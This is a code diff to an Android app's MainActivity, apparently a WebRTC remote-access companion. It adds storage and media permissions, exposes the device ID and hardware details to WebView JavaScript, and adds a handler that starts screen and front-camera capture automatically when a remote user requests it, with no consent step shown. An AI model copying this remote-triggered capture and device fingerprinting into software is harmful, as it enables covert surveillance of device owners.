@@ -63,22 +63,27 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     }
 
     private void requestAppPermissions() {
-        String[] permissions = new String[]{
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.MODIFY_AUDIO_SETTINGS
-        };
+        List<String> permList = new ArrayList<>();
+        permList.add(Manifest.permission.CAMERA);
+        permList.add(Manifest.permission.RECORD_AUDIO);
+        permList.add(Manifest.permission.MODIFY_AUDIO_SETTINGS);
 
-        boolean needsRequest = false;
-        for (String perm : permissions) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permList.add(Manifest.permission.READ_MEDIA_IMAGES);
+            permList.add(Manifest.permission.READ_MEDIA_VIDEO);
+        } else {
+            permList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
+
+        List<String> needed = new ArrayList<>();
+        for (String perm : permList) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                needsRequest = true;
-                break;
+                needed.add(perm);
             }
         }
 
-        if (needsRequest) {
-            ActivityCompat.requestPermissions(this, permissions, REQUEST_PERMISSIONS);
+        if (!needed.isEmpty()) {
+            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQUEST_PERMISSIONS);
         }
     }
 
@@ -235,6 +240,25 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
                 webRTCCompanion.setMyId(newId);
             }
         }
+
+        @JavascriptInterface
+        public String getDeviceId() {
+            return DeviceRegistry.getDeviceId(MainActivity.this);
+        }
+
+        @JavascriptInterface
+        public String getDeviceInfo() {
+            try {
+                org.json.JSONObject info = new org.json.JSONObject();
+                info.put("deviceId", DeviceRegistry.getDeviceId(MainActivity.this));
+                info.put("deviceName", DeviceRegistry.getDeviceModel());
+                info.put("ram", DeviceRegistry.getDeviceRam(MainActivity.this));
+                info.put("platform", "android");
+                return info.toString();
+            } catch (Exception e) {
+                return "{}";
+            }
+        }
     }
 
     @Override
@@ -377,6 +401,12 @@ public class MainActivity extends AppCompatActivity implements WebRTCCompanion.C
     }
     @Override public void onError(String error) {
         runOnUiThread(() -> Toast.makeText(this, error, Toast.LENGTH_SHORT).show());
+    }
+    @Override public void onAutoScreenShareRequest(String fromUser, boolean fullControl) {
+        runOnUiThread(() -> {
+            Log.i(TAG, "Auto screen share request from: " + fromUser + " (fullControl=" + fullControl + ")");
+            startScreenCaptureWithCamera(fromUser, fullControl, true, "front");
+        });
     }
 
     @Override
